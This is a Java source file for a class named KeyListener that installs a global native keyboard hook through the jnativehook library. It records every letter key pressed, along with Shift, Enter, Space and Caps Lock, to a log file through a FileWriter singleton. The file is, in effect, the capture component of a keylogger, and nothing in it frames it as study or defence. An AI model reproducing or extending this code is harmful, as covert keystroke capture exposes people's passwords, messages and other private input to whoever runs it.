package dev.source.logger;

import java.io.IOException;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import dev.source.utility.Commons;

public class KeyListener implements NativeKeyListener, AutoCloseable {
	private StringBuilder stringBuilder;
	private FileWriter fileWriter;

	public KeyListener() throws IOException {
		fileWriter = FileWriter.getInstance();
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent keyEvent) {
		if (keyEvent.getKeyCode() == NativeKeyEvent.VC_SHIFT || keyEvent.getKeyCode() == NativeKeyEvent.VC_ENTER
				|| keyEvent.getKeyCode() == NativeKeyEvent.VC_SPACE
				|| keyEvent.getKeyCode() == NativeKeyEvent.VC_CAPS_LOCK) {
			stringBuilder = new StringBuilder("[" + NativeKeyEvent.getKeyText(keyEvent.getKeyCode()) + "]");
			fileWriter.log(stringBuilder.toString().toUpperCase());
		}
		if (Commons.isLetter(keyEvent.getKeyCode())) {
			fileWriter.log(NativeKeyEvent.getKeyText(keyEvent.getKeyCode()));
		}
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent keyEvent) {
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent keyEvent) {
	}

	@Override
	public void close() throws Exception {
		if (fileWriter != null) {
			fileWriter.close();
		}
	}
}
